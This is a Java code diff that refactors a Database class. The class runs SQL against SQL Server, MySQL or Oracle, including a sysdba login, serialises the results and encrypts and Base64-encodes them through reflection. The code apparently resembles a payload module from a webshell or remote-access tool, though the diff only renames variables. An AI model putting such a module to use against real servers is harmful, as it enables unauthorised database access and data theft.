@@ -55,7 +55,6 @@ public class Database {
     }
 
     public String executeSQL() throws Exception {
-        String result = "[";
         String driver = null;
         String url = null;
         if (type.equals("sqlserver")) {
@@ -68,8 +67,7 @@ public class Database {
             driver = "oracle.jdbc.driver.OracleDriver";
             url = "jdbc:oracle:thin:@%s:%s:%s";
             if (user.equals("sys")) {
-                StringBuilder sb = new StringBuilder(user);
-                user = sb.append(" as sysdba").toString();
+                user += " as sysdba";
             }
         }
         String url2 = String.format(url, host, port, database);
@@ -82,27 +80,26 @@ public class Database {
         for (int i = 0; i < count; i++) {
             colNames[i] = metaData.getColumnLabel(i + 1);
         }
-        String result2 = result + "[";
-        int length = colNames.length;
-        for (int i2 = 0; i2 < length; i2++) {
-            result2 = result2 + String.format("{\"name\":\"%s\"}", colNames[i2]) + ",";
+        String result = "[" + "[";
+        for (int i2 = 0; i2 < colNames.length; i2++) {
+            result = result + String.format("{\"name\":\"%s\"}", colNames[i2]) + ",";
         }
-        String result3 = result2.substring(0, result2.length() - 1) + "],";
-        Map<String, Object> record = new LinkedHashMap<>();
+        String result2 = result.substring(0, result.length() - 1) + "],";
+        Map<String, Object> linkedHashMap = new LinkedHashMap<>();
         List<Map<String, Object>> recordList = new ArrayList<>();
         while (rs.next()) {
-            String result4 = result3 + "[";
+            String result3 = result2 + "[";
             for (String col : colNames) {
-                record.put(col, rs.getObject(col));
-                result4 = result4 + "\"" + rs.getObject(col) + "\",";
+                linkedHashMap.put(col, rs.getObject(col));
+                result3 = result3 + "\"" + rs.getObject(col) + "\",";
             }
-            recordList.add(record);
-            result3 = result4.substring(0, result4.length() - 1) + "],";
+            recordList.add(linkedHashMap);
+            result2 = result3.substring(0, result3.length() - 1) + "],";
         }
-        String result5 = result3.substring(0, result3.length() - 1) + "]";
+        String result4 = result2.substring(0, result2.length() - 1) + "]";
         rs.close();
         con.close();
-        return result5;
+        return result4;
     }
 
     private byte[] Encrypt(byte[] bs) throws Exception {
@@ -124,11 +121,11 @@ public class Database {
                     getClass();
                     Class Base64 = Class.forName("java.util.Base64");
                     Object Encoder = Base64.getMethod("getEncoder", null).invoke(Base64, null);
-                    value = (String) Encoder.getClass().getMethod("encodeToString", new Class[]{byte[].class}).invoke(Encoder, new Object[]{value.getBytes(StandardCharsets.UTF_8)});
+                    value = (String) Encoder.getClass().getMethod("encodeToString", byte[].class).invoke(Encoder, value.getBytes(StandardCharsets.UTF_8));
                 } else {
                     getClass();
                     Object Encoder2 = Class.forName("sun.misc.BASE64Encoder").newInstance();
-                    value = ((String) Encoder2.getClass().getMethod("encode", new Class[]{byte[].class}).invoke(Encoder2, new Object[]{value.getBytes(StandardCharsets.UTF_8)})).replace("\n", "").replace("\r", "");
+                    value = ((String) Encoder2.getClass().getMethod("encode", byte[].class).invoke(Encoder2, value.getBytes(StandardCharsets.UTF_8))).replace("\n", "").replace("\r", "");
                 }
             }
             sb.append(value);
